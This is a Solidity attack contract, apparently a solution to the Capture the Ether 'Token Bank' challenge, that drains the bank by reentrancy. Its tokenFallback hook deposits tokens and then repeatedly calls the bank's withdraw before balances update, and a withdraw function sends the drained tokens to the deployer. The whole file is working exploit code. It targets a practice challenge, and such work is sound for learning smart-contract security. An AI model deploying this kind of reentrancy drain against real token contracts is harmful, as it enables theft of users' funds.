pragma solidity ^0.6.0;
import "interfaces/ISimpleERC223Token.sol";
import "interfaces/ITokenBankChallenge.sol";

contract TokenBankAttack {
    ISimpleERC223Token token;
    ITokenBankChallenge bank;
    address payable player;

    constructor(ISimpleERC223Token _token, ITokenBankChallenge _bank) public {
        token = _token;
        bank = _bank;
        player = msg.sender;
    }

    function tokenFallback(
        address,
        uint256,
        bytes memory
    ) public {
        if (token.balanceOf(address(bank)) > 0) {
            if (bank.balanceOf(address(this)) == 0) {
                token.transfer(address(bank), token.balanceOf(address(this)));
            }
            bank.withdraw(bank.balanceOf(address(this)));
        }
    }

    function withdraw() external {
        token.transfer(player, token.balanceOf(address(this)));
    }
}
